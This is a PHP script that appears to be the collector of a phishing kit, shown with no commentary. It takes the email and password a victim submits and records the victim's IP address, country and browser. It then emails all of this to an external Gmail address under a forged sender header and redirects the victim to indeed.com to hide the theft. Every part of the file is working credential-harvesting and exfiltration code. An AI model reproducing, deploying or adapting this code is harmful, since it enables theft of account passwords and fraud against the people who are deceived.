<?php
	//session_start();
	$email = trim($_POST["email"]);
	$password = trim($_POST["password"]);


if($password != "")
{
	
	$adddate=date("D M d, Y g:i a");

	$ip = getenv("REMOTE_ADDR");

	$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));

	$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
	
	
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
	
$hostname = gethostbyaddr($ip);
	

$message .= "CodedByIP\n";
$message .= "E: " .$email. "\n";
//$message .= "MobileNo: " . $mobileno. "\n";
$message .= "Ps: " . $password . "\n"; 
$message .= "--------------IP DETAIL-----------------------\n";
$message .= "Date: ".$adddate."\n";
$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
$message .= "Ip Info       http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "---------------JeWireYo-------------\n";

$send = "daniellaolive7@gmail.com";
$subject = "REC_Result .$ip.";

$headers = "From: RECLOG<castillo.mendoza@smretall.com>\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
header ("Location: https://www.indeed.com/?co=US&hl=en&_ga=2.142977200.402697195.1565113394-286385773.1564667243");

}
else
{

header ("Location: home2.html");

}
	

?>